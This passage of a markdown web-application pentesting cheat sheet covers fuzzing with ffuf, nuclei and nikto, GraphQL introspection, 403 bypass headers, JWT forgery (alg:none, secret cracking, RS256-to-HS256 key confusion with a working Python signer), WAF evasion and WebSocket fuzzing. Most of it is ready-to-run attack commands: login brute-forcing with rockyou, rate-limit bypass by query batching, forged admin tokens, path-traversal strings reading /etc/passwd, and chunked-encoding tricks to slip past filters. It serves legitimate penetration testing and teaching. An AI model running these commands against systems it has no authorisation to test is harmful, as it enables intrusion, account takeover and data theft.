curl http://target.com/admin -H "Forwarded: for=127.0.0.1"
```

### URL Rewrite Headers

```bash
# Rewrite the path server-side — can bypass front-end restrictions
curl http://target.com/ -H "X-Original-URL: /admin"
curl http://target.com/ -H "X-Rewrite-URL: /admin"
curl http://target.com/index -H "X-Original-URL: /admin/panel"
```

### Referer / User-Agent Tricks

```bash
curl http://target.com/admin -H "Referer: http://target.com/admin"
curl http://target.com/admin -H "User-Agent: Googlebot/2.1"
```

### ffuf 403 Bypass Scan

```bash
# Try all path variations at once
ffuf -u http://target.com/FUZZ -w bypass_paths.txt -mc 200,301,302

# bypass_paths.txt contents:
# admin
# admin/
# admin/.
# admin//
# ./admin/
# %2fadmin
# admin%2f
# Admin
# ADMIN
```

---

## GraphQL Fuzzing

### Introspection — Dump Full Schema

```bash
# Check if introspection is enabled
curl -s -X POST http://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'

# Full introspection query
curl -s -X POST http://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind } } } } } }"}'

# Visualise schema with InQL (Burp extension) or graphql-voyager
```

### Endpoint Discovery

```bash
# Common GraphQL endpoints
/graphql
/api/graphql
/graphql/v1
/v1/graphql
/query
/gql
/graphiql
/playground

ffuf -u http://target.com/FUZZ -w graphql_endpoints.txt -X POST -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' -mc 200 -fr "errors"
```

### Field / Type Fuzzing

```bash
# Fuzz field names on a known type
ffuf -u http://target.com/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{ user { FUZZ } }"}' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fr "Cannot query field\|Unknown field"

# Fuzz argument values (e.g., IDOR via id)
ffuf -u http://target.com/graphql -X POST -H "Content-Type: application/json" -d '{"query":"{ user(id: FUZZ) { id email } }"}' -w ids.txt -mc 200 -fr '"user":null'
```

### Batching Abuse (Rate Limit Bypass)

```bash
# Send many queries in one request — bypasses per-request rate limiting
curl -s -X POST http://target.com/graphql -H "Content-Type: application/json" -d '[
    {"query":"mutation { login(user:\"admin\", pass:\"password1\") { token } }"},
    {"query":"mutation { login(user:\"admin\", pass:\"password2\") { token } }"},
    {"query":"mutation { login(user:\"admin\", pass:\"password3\") { token } }"}
  ]'
```

### Tools

```bash
# InQL — Burp extension for GraphQL schema analysis + fuzzing
# Extensions → BApp Store → InQL

# graphw00f — fingerprint GraphQL engine (git clone, run from repo)
git clone https://github.com/dolevf/graphw00f && cd graphw00f
python3 main.py -d -f -t http://target.com/graphql

# clairvoyance — recover schema when introspection is disabled
# (URL is positional, and it needs a wordlist)
pip3 install clairvoyance
clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt http://target.com/graphql
```

---

## Chaining Tools — Workflow Examples

### Dir → File Fuzz Each Discovered Directory

```bash
# Step 1: find directories
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -o dirs.json -of json

# Step 2: extract URLs from results
cat dirs.json | jq -r '.results[].url' > found_dirs.txt

# Step 3: fuzz files inside each found directory
while read dir; do
  ffuf -u "${dir}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.zip -mc 200 -s -o "files_$(echo $dir | md5sum | cut -c1-6).json" -of json
done < found_dirs.txt
```

### Subdomain → VHost → Dir per Host

```bash
# Step 1: subdomain brute
subfinder -d target.com -silent | tee subdomains.txt

# Step 2: probe live hosts
cat subdomains.txt | httpx -silent -status-code -title | tee live_hosts.txt

# Step 3: extract just the URLs
cat live_hosts.txt | awk '{print $1}' > live_urls.txt

# Step 4: dir fuzz each live host
while read url; do
  echo "[*] Fuzzing $url"
  ffuf -u "${url}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -ac -s >> all_dirs.txt
done < live_urls.txt
```

### Parameter Discovery → Vuln Fuzz

```bash
# Step 1: find hidden params with arjun
arjun -u http://target.com/search -oJ params.json

# Step 2: extract param names
cat params.json | jq -r '.[]' > param_names.txt

# Step 3: fuzz each param for LFI/SSRF/SQLi
while read param; do
  echo "[*] Testing param: $param"
  ffuf -u "http://target.com/search?${param}=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs <error_size> -s >> lfi_results.txt
done < param_names.txt
```

---

## Response Analysis — Spotting Anomalies

Beyond status codes and size — indicators that something interesting happened:

| Signal | What it may mean |
|---|---|
| Different response **size** | Different code path hit |
| Different response **time** | DB query / expensive operation (SQLi, SSRF) |
| Different **word/line count** | Different template or content rendered |
| `500` instead of `404` | Input reached backend code, triggered error |
| `200` with same size as `404` | Soft 404 — filter by content, not just code |
| `302` redirect to login | Resource exists, auth required |
| `403` (not `404`) | Resource exists, access denied — probe harder |
| Error message in body | Stack trace, DB error, path disclosure |
| Response time spike `>2s` | Potential blind SQLi or SSRF with internal request |

### Time-Based Detection with ffuf

```bash
# Show response times — look for outliers
ffuf -u "http://target.com/search?q=FUZZ" -w payloads.txt -mc all -fs <normal_size> -of json -o timing.json

# Extract slowest responses
cat timing.json | jq '.results | sort_by(.duration) | reverse | .[0:10] | .[] | {input: .input, duration: .duration, status: .status}'
```

---

## dirsearch

Simple, fast directory brute-forcer. Good for quick first-pass scans.

```bash
# Install
pip3 install dirsearch
# or
sudo apt install dirsearch

# Basic
dirsearch -u http://target.com

# With extensions
dirsearch -u http://target.com -e php,html,txt,bak,zip

# Custom wordlist
dirsearch -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# With auth cookie
dirsearch -u http://target.com --cookie "session=abc123"

# Threads + output
dirsearch -u http://target.com -e php,txt -t 50 -o output.txt

# Exclude status codes
dirsearch -u http://target.com --exclude-status 404,403
```

---

## nikto

Web server scanner — checks for known vulnerabilities, outdated software, misconfigs, and interesting default files. Fast first-pass before deep fuzzing.

```bash
# Basic scan
nikto -h http://target.com

# HTTPS
nikto -h https://target.com -ssl

# Specific port
nikto -h target.com -p 8080

# Save output
nikto -h http://target.com -o nikto_output.txt -Format txt
nikto -h http://target.com -o nikto_output.html -Format html

# Scan with auth
nikto -h http://target.com -id admin:password

# Scan through Burp proxy
nikto -h http://target.com -useproxy http://127.0.0.1:8080

# Tune scan (select check categories)
# -T 1 = Interesting files, 2 = Misconfigs, 3 = Info disclosure, 4 = Injection, 9 = SQL
nikto -h http://target.com -T 1234

# Multiple hosts from file
nikto -h hosts.txt
```

**What nikto finds:**
- Default files/dirs (phpinfo.php, /test/, /backup/, etc.)
- Server version disclosure
- Missing security headers
- Outdated software versions
- Dangerous HTTP methods (PUT, DELETE, TRACE)
- SSL/TLS issues

---

## nuclei

Template-based scanner. Runs hundreds of community-maintained checks for CVEs, misconfigs, exposed panels, default creds, and more. Run it against every discovered host.

```bash
# Install
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
# or
sudo apt install nuclei

# Update templates (do this first)
nuclei -update-templates

# Basic scan against single target
nuclei -u http://target.com

# Scan list of targets
nuclei -l targets.txt

# Specific template tags
nuclei -u http://target.com -tags cve
nuclei -u http://target.com -tags exposure
nuclei -u http://target.com -tags default-login
nuclei -u http://target.com -tags misconfig
nuclei -u http://target.com -tags sqli
nuclei -u http://target.com -tags xss

# Severity filter
nuclei -u http://target.com -severity critical,high
nuclei -u http://target.com -severity medium,high,critical

# Specific template
nuclei -u http://target.com -t technologies/apache/apache-detect.yaml
nuclei -u http://target.com -t http/exposures/

# Exclude templates
nuclei -u http://target.com -exclude-tags dos

# Rate limit (be careful on prod)
nuclei -u http://target.com -rate-limit 50 -concurrency 10

# Through Burp proxy
nuclei -u http://target.com -proxy http://127.0.0.1:8080

# Output
nuclei -u http://target.com -o nuclei_results.txt
nuclei -u http://target.com -jsonl -o nuclei_results.jsonl

# Combine with subfinder/httpx pipeline
subfinder -d target.com -silent | httpx -silent | nuclei -tags cve,misconfig -severity high,critical
```

**Key template categories:**

| Tag | Checks |
|---|---|
| `cve` | Known CVE exploits |
| `default-login` | Default credentials on panels |
| `exposure` | Exposed files (keys, tokens, configs) |
| `misconfig` | Misconfigured services |
| `takeover` | Subdomain/service takeover |
| `tech` | Technology fingerprinting |
| `sqli` | SQL injection |
| `xss` | Cross-site scripting |
| `ssrf` | Server-side request forgery |
| `lfi` | Local file inclusion |

---

## JWT Fuzzing

### Decode JWT (no tools needed)

```bash
# JWT = header.payload.signature (base64URL — translate -_ to +/ before base64 -d)
echo "eyJhbGciOiJIUzI1NiJ9" | tr '_-' '/+' | base64 -d        # decode header
echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | tr '_-' '/+' | base64 -d      # decode payload
```

### alg:none Attack

Remove signature verification by setting algorithm to `none`:

```bash
# Original header: {"alg":"HS256","typ":"JWT"}
# Modified header: {"alg":"none","typ":"JWT"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='    # encode new header
echo -n '{"user":"admin","role":"admin"}' | base64 | tr -d '=' # encode new payload

# Construct token: <new_header>.<new_payload>.   (empty signature, trailing dot)
curl http://target.com/admin -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
```

### Weak Secret Brute Force

```bash
# hashcat — JWT HS256 = mode 16500
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# john — hashcat 16500 is more reliable; john's HMAC-SHA256 format wants `data#hash`,
# not a bare JWT, so convert first (or just use hashcat above)
john jwt_token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# jwt_tool (git clone — not a PyPI package)
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt     # crack secret
```

### RS256 → HS256 Key Confusion

If server uses RS256 (asymmetric), switch to HS256 and sign with the public key as the HMAC secret:

```bash
# jwt_tool
jwt_tool <token> -X k -pk public_key.pem      # key confusion attack

# Manual — sign HS256 with the public-key BYTES as the HMAC secret.
# NOTE: modern PyJWT (2.x) BLOCKS this (raises InvalidKeyError when an asymmetric key
# is used with HS*), so build the token with raw hmac instead:
python3 -c "
import hmac, hashlib, base64, json
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
secret = open('public.pem','rb').read()          # exact public key bytes the server trusts
h = b64(json.dumps({'alg':'HS256','typ':'JWT'},separators=(',',':')).encode())
p = b64(json.dumps({'user':'admin','role':'admin'},separators=(',',':')).encode())
sig = b64(hmac.new(secret, f'{h}.{p}'.encode(), hashlib.sha256).digest())
print(f'{h}.{p}.{sig}')
"
```

### jwt_tool — Swiss Army Knife

```bash
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool   # not a PyPI package

python3 jwt_tool.py <token>             # decode and display
jwt_tool <token> -T                     # tamper — interactive mode
jwt_tool <token> -X a                   # alg:none attack
jwt_tool <token> -X s                   # self-signed (inject own key)
jwt_tool <token> -X k -pk pub.pem       # key confusion
jwt_tool <token> -C -d wordlist.txt     # crack HMAC secret
jwt_tool <token> -I -pc user -pv admin  # inject claim
```

### Burp — JWT Editor Extension

**Install:** Extensions → BApp Store → **JWT Editor**

- Highlights JWTs in requests automatically
- **Attacks tab** in Repeater: alg:none, embedded JWK, key confusion, JWKS spoofing
- Generate and embed RSA/EC/symmetric keys for signing

---

## WAF Evasion While Fuzzing

### Encoding Payloads

```bash
# URL encode — ffuf has a built-in urlencode input processor (cleaner than a wordlist):
ffuf -u "http://target.com/search?q=FUZZ" -w payloads.txt:FUZZ -enc FUZZ:urlencode
# (SecLists also ships '/usr/share/seclists/Fuzzing/special-chars + urlencoded.txt')

# Double URL encode (bypass single-decode WAFs)
# < becomes %253c (encode % to %25, then c)

# HTML entity encode
# < = &lt;  > = &gt;  " = &quot;

# Unicode encode
# < = \u003c  > = \u003e
```

### Chunked Transfer Encoding

```bash
# Bypass WAF body inspection by sending body in chunks
curl http://target.com/login -H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded" --data-binary $'5\r\nuser=\r\n5\r\nadmin\r\n0\r\n\r\n'
```

### Case Mangling

```bash
# SQL keywords
# SELECT → SeLeCt → %53%45%4c%45%43%54

# HTML tags
# <script> → <ScRiPt> → <SCRIPT>

# Path case (Windows IIS)
# /admin → /Admin → /ADMIN
```

### Header Manipulation

```bash
# Add extra headers to confuse WAF signature matching
curl http://target.com/ -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1"

# Rotate User-Agent
ffuf -u http://target.com/FUZZ -w wordlist.txt -H "User-Agent: UAFUZZ" -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt:UAFUZZ -w wordlist.txt:FUZZ
```

### Null Bytes / Comment Injection

```bash
# Null byte (terminate string early in some parsers)
# ../etc/passwd%00.jpg
# <script%00>alert(1)</script>

# SQL comment injection to break keyword detection
# SEL/**/ECT → SELECT (in SQL)
# un/**/ion → union
```

### Content-Type Switching

Changing Content-Type can hit different code paths or bypass WAF rules:

```bash
# Same params, different encoding — server may accept all
# application/x-www-form-urlencoded  →  user=admin&pass=test
# application/json                   →  {"user":"admin","pass":"test"}
# multipart/form-data                →  --boundary\nContent-Disposition: form-data; name="user"\n\nadmin
# text/xml                           →  <root><user>admin</user></root>

# ffuf — fuzz Content-Type
ffuf -u http://target.com/api/login -X POST -H "Content-Type: FUZZ" -d '{"user":"admin","pass":"test"}' -w content_types.txt -mc 200,302 -fs <fail_size>
```

---

## WebSocket Fuzzing

### Burp Suite — WebSocket History

1. Browse to page that uses WebSockets
2. **Proxy → WebSockets history** — view all WS frames
3. Right-click a message → **Send to Repeater**
4. Modify payload in Repeater → **Send** to replay

### wscat — CLI WebSocket Client

```bash
# Install
npm install -g wscat

# Connect (no auth)
wscat -c ws://target.com/ws

# Connect with auth header
wscat -c ws://target.com/ws -H "Authorization: Bearer <token>"

# Connect with cookie
wscat -c ws://target.com/ws -H "Cookie: session=abc123"

# Send messages interactively after connecting
> {"action":"ping"}
> {"action":"getUser","id":1}
> {"action":"getUser","id":2}    # IDOR via WebSocket
```

### Manual Fuzzing via Burp Repeater

```text
# Intercept WS handshake → send upgrade request to Repeater
# Or: WS History → right-click frame → Send to Repeater

# Test for:
# - IDOR: change user IDs in payloads
# - SQLi: inject SQL in JSON values
# - Command injection: inject OS commands in action fields
# - Auth bypass: remove/modify auth tokens in WS messages
# - XSS via WS: inject script tags in messages that reflect to other users
```

### Fuzzing with Burp Intruder (WS)

```text
# WS History → right-click → Send to Intruder
# Mark position in message payload
# Set wordlist → Start Attack
# Sort by response length/content to find anomalies
```

---

## ffuf — Proxy Integration

```bash
# Send ALL requests through Burp (slow — every request visible in Burp)
ffuf -u http://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080

# -replay-proxy — only forward INTERESTING hits to Burp (much better)
# ffuf handles filtering, only matched results go to Burp for inspection
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -replay-proxy http://127.0.0.1:8080

# Useful pattern: run fast scan, review only hits in Burp
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -ac -replay-proxy http://127.0.0.1:8080
```

---

## Output & Reporting

```bash
# Save ffuf output
ffuf -u http://target.com/FUZZ -w wordlist.txt -o results.json -of json
ffuf -u http://target.com/FUZZ -w wordlist.txt -o results.csv -of csv
ffuf -u http://target.com/FUZZ -w wordlist.txt -o results.html -of html

# Parse JSON results
cat results.json | jq '.results[] | .url'
cat results.json | jq '.results[] | {url: .url, status: .status, length: .length}'
```

---

## Tips

- **Always baseline first** — make a request to a non-existent path, note the response size/code, filter it with `-fs`
- **Use `-ac`** (auto-calibrate) when unsure — ffuf detects the baseline automatically
- **Rate limit on sensitive targets** — use `-rate 50` or `-t 10` to avoid detection/lockouts
- **Pipe discovered paths back into ffuf** — use results from dir fuzz as base for file fuzz
- **Check 403s** — see 403 Bypass section above
- **Match on redirect destination** — use `-mr "Location: /dashboard"` to catch redirects to success pages
- **Response time spikes** — flag anything `>2s` as a potential blind injection candidate
- **Soft 404s** — if every path returns 200 with the same size, filter by content with `-fr "Not Found"` or `-fs <size>`
- **Wordlists find nothing? It's probably an SPA** — stop brute-forcing and crawl instead (see [[#Crawling & JS Endpoint Extraction]]); the routes are in the JS bundle, not on the filesystem

---

## Quick Reference

| Goal | Command |
|---|---|
| Dir fuzz (auto-calibrate) | `ffuf -u http://target.com/FUZZ -w raft-medium-directories.txt -ac` |
| Recursive dir fuzz | `ffuf -u http://target.com/FUZZ -w raft-medium-directories.txt -recursion -recursion-depth 3 -mc 200,301,302,403` |
| File/extension fuzz | `ffuf -u http://target.com/FUZZ -w raft-medium-words-lowercase.txt -e .php,.html,.txt,.bak -mc 200` |
| Param name fuzz | `ffuf -u "http://target.com/search?FUZZ=test" -w burp-parameter-names.txt -fs <default>` |
| POST login brute force | `ffuf -u http://target.com/login -X POST -d "username=admin&password=FUZZ" -w rockyou.txt -fc 401` |
| Vhost fuzz | `ffuf -u http://TARGET_IP -H "Host: FUZZ.target.com" -w subdomains-top1million-5000.txt -fs <default>` |
| Multi-position (users+passwords) | `ffuf -u http://target.com/login -d "username=USER&password=PASS" -w users.txt:USER -w rockyou.txt:PASS -mode pitchfork -fc 401` |
| Gobuster dir | `gobuster dir -u http://target.com -w raft-medium-directories.txt -x php,html,txt -t 50` |
| Gobuster vhost | `gobuster vhost -u http://target.com -w subdomains-top1million-5000.txt --append-domain -t 50` |
| Recursive discovery (auto) | `feroxbuster -u http://target.com -w raft-medium-directories.txt` |
| API-aware fuzzing | `kr scan http://target.com -w routes-large.kite` |
| Crawl a JS-heavy SPA | `katana -u https://target.com -headless -jc -d 3` |
| Extract endpoints from a JS bundle | `curl -s https://target.com/static/main.js \| grep -oE '"(/[a-zA-Z0-9_/.-]{3,})"'` |
| Hidden parameter discovery | `arjun -u http://target.com/search -m GET` |
| Template-based vuln scan | `nuclei -u http://target.com -tags cve,exposure,default-login -severity high,critical` |
| First-pass web scan | `nikto -h http://target.com` |
| 403 bypass probe | `curl http://target.com/admin -H "X-Forwarded-For: 127.0.0.1"` / try `/admin/.`, `/admin%2f`, `-X POST` |
| GraphQL introspection | `curl -X POST http://target.com/graphql -d '{"query":"{ __schema { types { name } } }"}'` |
| JWT alg:none | `jwt_tool <token> -X a` |
| JWT secret crack | `hashcat -m 16500 jwt_token.txt rockyou.txt` |
| Race condition (single packet) | Turbo Intruder `examples/raceConditionFullSpeed.py`, `concurrentConnections=1` |
| WebSocket manual fuzz | `wscat -c ws://target.com/ws -H "Authorization: Bearer <token>"` |
| Route interesting hits through Burp only | `ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -replay-proxy http://127.0.0.1:8080` |

---

*Created: 2026-03-02*
*Updated: 2026-08-14*
*Model: claude-opus-5*